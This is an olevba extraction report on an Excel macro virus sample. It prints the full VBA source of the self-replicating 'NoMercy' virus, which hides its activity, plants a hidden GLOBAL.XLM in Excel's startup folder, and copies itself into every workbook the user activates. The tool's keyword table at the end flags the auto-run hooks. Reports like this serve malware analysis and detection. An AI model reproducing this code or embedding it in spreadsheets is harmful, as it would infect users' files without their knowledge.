olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Tjoro-77d99878eb44cbdf5e6c3dfe0ccfc60d954623d4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO NoMercy.bas 
in file: Virus.MSExcel.Tjoro-77d99878eb44cbdf5e6c3dfe0ccfc60d954623d4 - OLE stream: '_VBA_PROJECT_CUR/VBA/NoMercy'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo bye
Application.ScreenUpdating = False 'cover our dirty work from user
Application.DisplayAlerts = False  'disable the alert
If cek_global() Then
'global exist so leave it alone
    GoTo FuckSheet:
Else
'infect_global
    infectglobal    'infect the GLOBAL.XLM
End If
FuckSheet:
'trigger on every activation sheet
Application.OnSheetActivate = "GLOBAL.XLM!Fuck"
bye:
End Sub

Function cek_global() As Boolean
Attribute cek_global.VB_ProcData.VB_Invoke_Func = " \n14"
cek_global = False
For x = 1 To Application.Workbooks.Count
    If Application.Workbooks(x).Name = "GLOBAL.XLM" Then
    'global exist
    For y = 1 To Application.Workbooks("GLOBAL.XLM").Modules.Count
        If Application.Workbooks("GLOBAL.XLM").Modules(y).Name = "NoMercy" Then
        cek_global = True
        End If
    Next y
    End If
Next x
End Function

Function infectglobal()
Attribute infectglobal.VB_ProcData.VB_Invoke_Func = " \n14"
 ' Dim activebook As String
  activebook = ActiveWorkbook.Name
  Workbooks(activebook).SaveCopyAs Application.StartupPath + "\GLOBAL.XLM"
 'now we need to open it up and make it visible
  Workbooks.Open (Application.StartupPath + "\GLOBAL.XLM")
  Windows("GLOBAL.XLM").Visible = False
 'save the change
 Application.Workbooks("GLOBAL.XLM").Save
End Function

'========================================================
Function inFuckIt() As Boolean
Attribute inFuckIt.VB_ProcData.VB_Invoke_Func = " \n14"
activebook = ActiveWorkbook.Name
inFuckIt = False
For y = 1 To Application.Workbooks(activebook).Modules.Count
    If Application.Workbooks(activebook).Modules(y).Name = "NoMercy" Then
    inFuckIt = True
    End If
Next y
End Function
'=====================================
Sub Fuck()
Attribute Fuck.VB_ProcData.VB_Invoke_Func = " \n14"
    'Dim activebook As String
    oactivebook = ActiveWorkbook.Name
    If inFuckIt() Then  'cek are we already fuck this WorkBook
    'this workbook already infected
    GoTo bye2
    End If
    'Nop, this WorkBook seem innocent so....
    Application.ScreenUpdating = False
    Application.Windows("GLOBAL.XLM").Visible = True
    Workbooks("GLOBAL.XLM").Activate
    Sheets("NoMercy").Visible = True
    Workbooks("GLOBAL.XLM").Sheets("NoMercy").Copy Before:=Workbooks(oactivebook).Sheets(1)
    Workbooks(oactivebook).Sheets("NoMercy").Visible = False
    'save the change
    Workbooks("GLOBAL.XLM").Sheets("NoMercy").Visible = False
    Windows("GLOBAL.XLM").Visible = False
bye2:
Close
End Sub

Sub Auto_Close()
Attribute Auto_Close.VB_ProcData.VB_Invoke_Func = " \n14"
Application.DisplayAlerts = False  'disable the alert
Application.Workbooks("GLOBAL.XLM").Save
If Day(Date) = 11 Then
    MsgBox "Hello there...you are infected with NoMercy!", 0, "Hello..."
End If
'cover the error when exit from excel
On Error GoTo bye3
Application.Workbooks(ActiveWorkbook.Name).Save
bye3:
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  NoMerc
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|open                |May open a file                              |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
+----------+--------------------+---------------------------------------------+

